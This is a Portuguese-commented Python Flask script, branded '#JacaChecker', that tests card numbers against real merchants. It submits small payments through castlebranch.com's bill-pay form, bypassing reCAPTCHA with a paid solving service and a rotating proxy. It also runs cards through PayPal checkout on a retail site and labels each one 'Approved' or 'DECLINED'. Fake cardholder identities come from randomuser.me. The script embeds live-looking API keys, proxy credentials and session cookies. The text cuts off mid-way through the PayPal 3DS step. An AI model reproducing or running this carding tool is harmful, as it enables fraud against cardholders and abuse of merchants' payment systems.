import csv
import json
from flask import Flask, request, render_template, jsonify
from flask_cors import CORS
import os
from bs4 import BeautifulSoup
import http.client
import threading, requests, random, time, random, re, base64
from urllib3 import disable_warnings
from colorama import Fore
import concurrent.futures

disable_warnings()

    
app = Flask(__name__)

CORS(app)
    
def get(data, esquerda, direita):
    return data.partition(esquerda)[-1].partition(direita)[0]

disable_warnings()

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)



# class RequisicaoException(Exception):
#     def __init__(self):
#         super().__init__()

def bins(bin):
    try:
        req = requests.get(
            f"https://data.handyapi.com/bin/{bin}",
            #headers={"x-api-key": "fe8d6db2967a4e77b4d7268448897c95"},
            verify=False,
        )
        if req.status_code == 200:
            try:
                tipo = req.json()["Type"]
                nivel = req.json()["CardTier"]
                banco = req.json()["Issuer"]
                pais = req.json()["Country"]["A2"]
   
                return f"{tipo} {nivel} {banco} {pais}".upper()
            except:
                return "SEM INFORMAÇÃO DA BIN"
        else:
            return "SEM INFORMAÇÃO DA BIN"
    except:
        return "SEM INFORMAÇÃO DA BIN"
    
def add_padding(b64_string):
    return b64_string + '=' * (4 - len(b64_string) % 4)

def decode_payload(encoded_jwt):
    # Adicionar padding se necessário e decodificar a parte codificada
    padded_jwt = add_padding(encoded_jwt)
    decoded_bytes = base64.urlsafe_b64decode(padded_jwt)
    decoded_str = decoded_bytes.decode('utf-8')
    return json.loads(decoded_str)




def zeroesquerda(start=7, end=11):

    random_number = random.randint(start, end)

    mes = f"{random_number:02}"
    
    return mes
def capmonster():
    
    
    
    key = "7aac8c3a5d12e385087ae61290ebcd98"
    
    
    data = {
        "clientKey": f"{key}",
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": f"https://www.castlebranch.com/pay-bill",
            "websiteKey": "6LfdLhUTAAAAANBE-B2ItEBVtoSE2g1ovNiWoGr-",
            #"minScore": min_score
        },
    }
    
    
    
    criar = requests.post(
        "https://api.capmonster.cloud/createTask", verify=False, json=data
    )



    if 'ERROR_ZERO_BALANCE' in criar.text:
        print("ACABOU SALDO CAPMONSTER")



    taskId = criar.json()["taskId"]
    
    

    while True:
        data = {"clientKey": f"{key}", "taskId": taskId}
        resultado = requests.post(
            "https://api.capmonster.cloud/getTaskResult", verify=False, json=data
        )

        

        if '"status":"ready"' in resultado.text:
            return resultado.json()["solution"]["gRecaptchaResponse"]
        #time.sleep(1)



def ng(c1, month, year, cvv):
    bot(c1, month, year, cvv)

def bot(c1, month, year, cvv):
    try:    
        url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
        headers = {
                'Host': 'randomuser.me',
                'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://namso-gen.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://namso-gen.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }
        response = requests.get( url, headers=headers, verify=False)
        em = get(response.text, '"email":"','"')
        
        nm = get(response.text, '"first":"','"')
        
        sn = get(response.text, '"last":"','"')
        if response.status_code == 200:

            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-jacare:jacarepagu4@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-jacare:jacarepagu4@brd.superproxy.io:22225'}
            url = "https://www.castlebranch.com/pay-bill"
            payload = {}
            headers = {
            'Host': 'www.castlebranch.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'Sec-Purpose': 'prefetch;prerender',
            'Purpose': 'prefetch',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            }
            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
            xs = response.cookies.get('XSRF-TOKEN')
            
            cs = response.cookies.get('castlebranch_session')
            
            t0 = get(response.text, ' name="_token" value="','"')
            
            
            url = "https://www.castlebranch.com/sitemessage"
            payload = {}
            headers = {
                
            'Host': 'www.castlebranch.com',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'Accept': '*/*',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.castlebranch.com/pay-bill',
            'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cookie': f'_ga=GA1.2.1373842639.1720148682; _gid=GA1.2.2089451117.1720148682; _ga_1GF4HYRJCF=GS1.2.1720196042.2.1.1720196177.60.0.0; XSRF-TOKEN={xs}; castlebranch_session={cs}; cbservid=serv7|Zogyj|Zogby'
            
            }
            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
            invoice = random.randint(00000,99999)
            
            recap = capmonster()
            
            
            if len(year) == 4:
                year = year[2:]
                
            url = "https://www.castlebranch.com/pay-bill"
            payload = {
                "_token": t0,
                "address": "911 W Grace St",
                "amount": "1",
                "ccname": F"{nm} {sn}",
                "city": "Richmond",
                "company": "Mr",
                "creditcard": c1,
                "customer": invoice,
                "email": em,
                "exp1": month,
                "exp2": year,
                "g-recaptcha-response": recap,
                "invoice": invoice,
                "phoneno": f"8{invoice}8195",
                "state": "Vermont",
                "zipcode": "23220"
                }
            headers = {
                'Host': 'www.castlebranch.com',
                'Cache-Control': 'max-age=0',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Upgrade-Insecure-Requests': '1',
                'Origin': 'https://www.castlebranch.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-User': '?1',
                'Sec-Fetch-Dest': 'document',
                'Referer': 'https://www.castlebranch.com/pay-bill',
                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cookie': f'_ga=GA1.2.1373842639.1720148682; _gid=GA1.2.2089451117.1720148682; cbservid=serv7|Zogyj|Zogby; XSRF-TOKEN={xs}; castlebranch_session={cs}; _gat=1; _ga_1GF4HYRJCF=GS1.2.1720201868.3.0.1720201868.60.0.0',
                'Content-Type': 'application/x-www-form-urlencoded'
                }
            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p)
            if 'Location' in response.headers:
                
                url = "https://www.castlebranch.com/pay-bill"
                payload = {}
                headers = {
                'Host': 'www.castlebranch.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Referer': 'https://www.castlebranch.com/pay-bill',
                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'Cookie': f'_ga=GA1.2.1373842639.1720148682; _gid=GA1.2.2089451117.1720148682; _gat=1; _ga_1GF4HYRJCF=GS1.2.1720201868.3.0.1720201868.60.0.0; XSRF-TOKEN={xs}; castlebranch_session={cs}; cbservid=serv7|Zogyp|Zogby'
                }
                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
                
                if len(year) == 4:
                    year = '20' + year
                    
                    
                    
                if 'was accepted' in response.text:
                    info = bins(c1[:6])       
                    x = f"{c1}|{month}|{year}|{cvv}| {info} - Status: Approved"                          
                    print(Fore.GREEN + f"{x} #JacaChecker") 
                    return {"codee": 0, "mensageme": f"{x} #JacaChecker<br>"}  

                elif 'Unknown error occured' in response.text:  
                    info = bins(c1[:6])
                    x = f"{c1}|{month}|{year}|{cvv}| {info} - Status: DECLINED"      
                    print(Fore.RED + f"{x} #JacaChecker")   
                    return {"codee": 2, "mensageme": f"{x} #JacaChecker<br>"}  
  
                
                
                elif 'The credit card was Declined' in response.text:  
                    info = bins(c1[:6])
                    x = f"{c1}|{month}|{year}|{cvv}| {info} - Status: DECLINED"      
                    print(Fore.RED + f"{x} #JacaChecker") 
                    return {"codee": 2, "mensageme": f"{x} #JacaChecker<br>"}  

                
                
                else:
                        print(Fore.RED + 'Gateway Error')
                        return {"codee": 2, "mensageme": f"{x} #JacaChecker<br>"}  

                    
    except requests.exceptions.ProxyError:
        ng(c1, month, year, cvv)

    except requests.exceptions.ConnectionError:
        ng(c1, month, year, cvv)

    except requests.exceptions.RequestException:
        ng(c1, month, year, cvv)





def ret(c1, month, year, cvv):
        verify(c1, month, year, cvv)
 
def verify(c1, month, year, cvv):
    try:    
        url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
        headers = {
                'Host': 'randomuser.me',
                'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
                'accept': 'application/json, text/plain, */*',
                'sec-ch-ua-mobile': '?0',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
                'sec-ch-ua-platform': '"Windows"',
                'origin': 'https://namso-gen.com',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'referer': 'https://namso-gen.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
                }
        response = requests.get( url, headers=headers, verify=False)
        email = get(response.text, '"email":"','"')
        emailnovo = email.replace('example', 'gmail')
        nome = get(response.text, '"first":"','"')
        sobrenome = get(response.text, '"last":"','"')
        street = get(response.text, '"name":"','"},"city"')
        snumber = get(response.text, '"street":{"number":',',')
        city = get(response.text, '"city":"','"')
        state = get(response.text, '"state":"','"')
        state = state[0:2].upper()
        postcode = get(response.text, '"postcode":',',')
        company = get(response.text, '"username":"','"')
        tel = random.randint(11111,99992)
        tel2 = random.randint(111,999)
        tel3 = random.randint(111,999)
        birth_ano = random.randint(1950,2001)
        birth_mes = random.randint(1,12)
        birth_dia = random.randint(1,30)
        amount = random.uniform(1.00, 4.00)
        amount = "{:.2f}".format(amount)
        if response.status_code == 200:

            p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-jacare:jacarepagu4@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-jacare:jacarepagu4@brd.superproxy.io:22225'}


            url = "https://www.anaisetvalentin.com/en/order"
            payload = {}
            headers = {
            'Host': 'www.anaisetvalentin.com',
            'Cookie': 'st_notification_1=0; PHPSESSID=ba3f1f96abcc4b09772940744436a021; _gid=GA1.2.1641848675.1721092806; PrestaShop-8958b20ebc07717dadd60b4af969ad37=def50200098fbbc9bf9889a88ce53fb938a7eebc72aafd0c53836963ff909c8b89e5ab1d66149c91015c9d1c8552c0e7aef03e83c71a65cb6858c6a72d3c2f44b65394185cdc00f2c165a9d9ffc75df0ac480df47abef82a2291d6b49da47e67880c6a34c8bbec49461563352bde2b8efdca7411721a10bb9dca591b6c25c742263369def5331d587ef5473753cdf91fb87b5535a2c856c7da22e262370cf1ffc07da38456028072c0570cc939071d654d6520fed5bd58fcbee78e62846c39c1d7617c2821dd1b7b543aafc0b5742c3fe4ae50b1596f990cc9b3803b54c064d8b062409e5a481c5590b6894b9eb46f27bb219996a5d6b7e631a208b59dd2427824d0abdd88c7a067de03efeb6aad14c40cf61a524a3827afb6ef3ac8ecb6810c6770e7de50fe33c56c9d6e587fe08778eb3f031cd02a8e2f7c291d36e73d6af388abe902290886f75c8380d83da8c10da7a88906028077873d55508bf326fbf52ba2fe1bf6f6cb4e42dde91b4f85b54011bc142215a47e9c5e04c72838ad4588a916269d2d46b33eaa2242fb9c722aedf8325025de7bb77386f9b52d08faf2b4c4a77c549cee7c2e33e8ad645da16c0314cd3b4eb60de333c50044e6b954d2d9dbb1a1a1b7f99b280c3bd45e788e9888b7365ac311ee709a7bea9e4387aeb0b01007591bb64bcc2b36047a1293; _gat_gtag_UA_156706668_1=1; _ga_GVH82HQ5J3=GS1.1.1721098220.3.1.1721099368.13.0.0; _ga=GA1.1.261465340.1720662002',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://www.anaisetvalentin.com/en/cart?action=show',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=0, i'
            }
            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
            client_id = get(response.text, 'client-id=','&')
            order_id = get(response.text, 'var paypalOrderId = "','";')
            pattern = r"paypalScript\.setAttribute\('data-client-token', \"([^\"]+)\"\)"
            match = re.search(pattern, response.text)
            if match:
                encoded_jwt = match.group(1)
            ecoded_payload = decode_payload(encoded_jwt)
            access_token = ecoded_payload.get('paypal', {}).get('accessToken')

            url = f"https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=pill&style.tagline=false&style.menuPlacement=below&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_54f7be8769_mdm6mdk6nde&clientAccessToken={access_token}&customerId=&clientID={client_id}&clientMetadataID=uid_d8f0d2717b_mdi6nta6ndq&commit=true&components.0=buttons&components.1=hosted-fields&currency=EUR&debug=false&disableSetCookie=true&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOmZhbHNlLCJpbnN0YWxsbWVudHMiOmZhbHNlLCJ2ZW5kb3JzIjp7InZpc2EiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sIm1hc3RlcmNhcmQiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImFtZXgiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sImRpc2NvdmVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiaGlwZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiZWxvIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX19LCJndWVzdEVuYWJsZWQiOnRydWV9LCJ2ZW5tbyI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhdWx0YWJsZSI6ZmFsc2V9LCJpdGF1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImNyZWRpdCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJhcHBsZXBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJzZXBhIjp7ImVsaWdpYmxlIjpmYWxzZX0sImlkZWFsIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJhbmNvbnRhY3QiOnsiZWxpZ2libGUiOmZhbHNlfSwiZ2lyb3BheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJlcHMiOnsiZWxpZ2libGUiOmZhbHNlfSwic29mb3J0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm15YmFuayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwMjQiOnsiZWxpZ2libGUiOmZhbHNlfSwid2VjaGF0cGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBheXUiOnsiZWxpZ2libGUiOmZhbHNlfSwiYmxpayI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJ0cnVzdGx5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIm94eG8iOnsiZWxpZ2libGUiOmZhbHNlfSwiYm9sZXRvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0b2JhbmNhcmlvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm1lcmNhZG9wYWdvIjp7ImVsaWdpYmxlIjpmYWxzZX0sIm11bHRpYmFuY28iOnsiZWxpZ2libGUiOmZhbHNlfSwic2F0aXNwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwicGFpZHkiOnsiZWxpZ2libGUiOmZhbHNlfX0&intent=capture&locale.country=PT&locale.lang=pt&merchantID.0=NYFL2YT3H434J&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&sessionID=uid_d8f0d2717b_mdi6nta6ndq&sdkCorrelationID=f591766346bd5&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jb21wb25lbnRzPWhvc3RlZC1maWVsZHMsYnV0dG9ucyZjbGllbnQtaWQ9QVhqWUZYV3liNHhKQ0VyVFVEaUZrekwwVWxubi1iTW00ZmFsNEctMW5RWFExWlF4cDA2Zk91RTduYUtVWEdrcTJUWnBZU2lJOXhYYnM0ZW8mbWVyY2hhbnQtaWQ9TllGTDJZVDNINDM0SiZpbnRlbnQ9Y2FwdHVyZSZjdXJyZW5jeT1FVVIiLCJhdHRycyI6eyJkYXRhLXVpZCI6InVpZF9jb25qcXNlc3ZkY3l1a3ljZWNsbGR4dHhwamlhZGgifX0&sdkVersion=5.0.450&storageID=uid_ec7ac1d3cc_mde6ndk6mjg&supportedNativeBrowser=false&supportsPopups=true&vault=false"
            payload = {}
            headers = {
            'Host': 'www.paypal.com',
            'Cookie': 'cookie_check=yes; d_id=d235792b9c2a4780811690d99e08b0a61715658714954; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; KHcl0EuY7AKSMgfvHl7J5E7hPtK=IyYas113zKGxOqzwgBfkQt3zS1qYm69fmtUTSa2em3avgYnWnrWnEbGquQOleKDWQH7XApAjtad0FOnW; LANG=en_US%3BUS; nsid=s%3AbEzMme3e80J9aAJ6am4xzVVR1ZRk3X1B.RNpKf1eQYAQAjWh62%2B2lZOQyW2POLsvJWOlOObb7yCM; sc_f=TSEhqEOt4JrCfR--8egw5EsVogeGvmbSRG4ySzyRviuoFcnu5CfCs4cvf50Lm05mRTiP6e2MuMXZbHzJi29TLig1VLlnAyTdV9W3yG; enforce_policy=ccpa; ts_c=vr%3D2700a75418f0a89921410487fb330673%26vt%3Db956135b1900aa58f8215f14fbd67ebf; l7_az=dcg14.slc; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6InBpVGJMZnJTQS1NOEFxaHotVzNMU1paSk9PYkZ0YlRub2pOMzVDT0tzMjNUMC03aDk4Z0dvN1lGSDIxcWpxQ0F5Sl8zdk55djlSQnhUdW9SRG1TRFhrRUs0dlRBRXZKMkUycW1LdjZIRmlhMFpfNFplVFhiZG9GRk1ycUJkbjJYYjNkMy1QQkVkelhiSWl2SWkxdlBOeWdsTlFqT2x0bEtKT1JxUUxQekVvU29SanBpZVlSX1JiVk9jLVciLCJpYXQiOjE3MjEwOTgyNzgsImV4cCI6MTcyMTEwMTg3OH0.h1ZcNAtSDVlgzSqmbyI8a2ZQ8yEho7FWZJFrw86UVb8; x-pp-s=eyJ0IjoiMTcyMTA5ODI3OTQ2NCIsImwiOiIwIiwibSI6IjAifQ; tsrce=heliosnodeweb; ts=vreXpYrS%3D1815706872%26vteXpYrS%3D1721100672%26vr%3D2700a75418f0a89921410487fb330673%26vt%3Db956135b1900aa58f8215f14fbd67ebf%26vtyp%3Dreturn',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-dest': 'iframe',
            'referer': 'https://www.anaisetvalentin.com/',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=0, i'
            }
            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
            sdkmeta = get(response.text, '"sdkMeta":"','"')
            if len(year) == 2:
                year = f"20{year}"


            url = f"https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source"
            payload = {
                "payment_source": {
                    "card": {
                    "number": c1,
                    "expiry": f"{year}-{month}",
                    "security_code": "222",
                    "attributes": {
                        "verification": {
                        "method": "SCA_ALWAYS"
                        }
                    }
                    }
                },
                "application_context": {
                    "vault": False
                }
                }
            headers = {
            'Host': 'cors.api.paypal.com',
            'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            'paypal-client-metadata-id': '3cd7972954c2ca0c150badfde44a8ae0',
            'sec-ch-ua-mobile': '?0',
            'authorization': f'Bearer {access_token}',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
            'content-type': 'application/json',
            'braintree-sdk-version': '3.32.0-payments-sdk-dev',
            'sec-ch-ua-platform': '"Windows"',
            'accept': '*/*',
            'origin': 'https://assets.braintreegateway.com',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://assets.braintreegateway.com/',
            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
            'priority': 'u=1, i'
            }
            response = requests.request("POST", url, headers=headers, json=payload, verify=False, proxies=p)
            if 'PAYER_ACTION_REQUIRED' in response.text:

                #ENTREGA RESPONSE x-csrf-jwt HELIOS SESSION
                url = f"https://www.paypal.com/webapps/helios?action=verify&xcomponent=1&flow=3ds&cart_id={order_id}&client_id={client_id}&sdkMeta={sdkmeta}"
                payload = {}
                headers = {
                'Host': 'www.paypal.com',
                'Cookie': 'cookie_check=yes; d_id=d235792b9c2a4780811690d99e08b0a61715658714954; cookie_prefs=T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner; KHcl0EuY7AKSMgfvHl7J5E7hPtK=IyYas113zKGxOqzwgBfkQt3zS1qYm69fmtUTSa2em3avgYnWnrWnEbGquQOleKDWQH7XApAjtad0FOnW; LANG=en_US%3BUS; nsid=s%3AbEzMme3e80J9aAJ6am4xzVVR1ZRk3X1B.RNpKf1eQYAQAjWh62%2B2lZOQyW2POLsvJWOlOObb7yCM; sc_f=TSEhqEOt4JrCfR--8egw5EsVogeGvmbSRG4ySzyRviuoFcnu5CfCs4cvf50Lm05mRTiP6e2MuMXZbHzJi29TLig1VLlnAyTdV9W3yG; enforce_policy=ccpa; ts_c=vr%3D2700a75418f0a89921410487fb330673%26vt%3Db956135b1900aa58f8215f14fbd67ebf; l7_az=dcg14.slc; x-csrf-jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6InBpVGJMZnJTQS1NOEFxaHotVzNMU1paSk9PYkZ0YlRub2pOMzVDT0tzMjNUMC03aDk4Z0dvN1lGSDIxcWpxQ0F5Sl8zdk55djlSQnhUdW9SRG1TRFhrRUs0dlRBRXZKMkUycW1LdjZIRmlhMFpfNFplVFhiZG9GRk1ycUJkbjJYYjNkMy1QQkVkelhiSWl2SWkxdlBOeWdsTlFqT2x0bEtKT1JxUUxQekVvU29SanBpZVlSX1JiVk9jLVciLCJpYXQiOjE3MjEwOTgyNzgsImV4cCI6MTcyMTEwMTg3OH0.h1ZcNAtSDVlgzSqmbyI8a2ZQ8yEho7FWZJFrw86UVb8; x-pp-s=eyJ0IjoiMTcyMTA5ODI3OTQ2NCIsImwiOiIwIiwibSI6IjAifQ; tsrce=heliosnodeweb; ts=vreXpYrS%3D1815706872%26vteXpYrS%3D1721100672%26vr%3D2700a75418f0a89921410487fb330673%26vt%3Db956135b1900aa58f8215f14fbd67ebf%26vtyp%3Dreturn',
                'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'sec-fetch-site': 'cross-site',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'iframe',
                'referer': 'https://www.anaisetvalentin.com/',
                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
                'priority': 'u=0, i'
                }
                response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
                xcsrfjwt = response.headers.get('x-csrf-jwt')
                xcsrfjwt_cookies = response.cookies.get('x-csrf-jwt')
                soup = BeautifulSoup(response.text, 'html.parser')
                account_numbers = [span.text for span in soup.find_all(class_='accountNumber')]
                account1 = account_numbers[0] if len(account_numbers) > 0 else None
                account2 = account_numbers[1] if len(account_numbers) > 1 else None


                #RECEBE RESPONSE x-csrf-jwt HELIOS SESSION
                url = f"https://www.paypal.com/webapps/helios/api/checkout/{order_id}/session?meta=%7B%22token%22%3A%22{order_id}%22%2C%22cartId%22%3A%22{order_id}%22%2C%22calc%22%3A%2222e08a10e2c16%22%2C%22csci%22%3A%22a7a2312be6c34dacb0ce9fed8d451647%22%2C%22locale%22%3A%7B%22country%22%3A%22US%22%2C%22language%22%3A%22en%22%7D%2C%22state%22%3A%22ui_checkout_redirectToThreeDs%22%2C%22action%22%3A%22verify%22%2C%22flow%22%3A%223ds%22%2C%22app_name%22%3A%22heliosnodeweb%22%7D"
                payload = {}
                headers = {
                'Host': 'www.paypal.com',
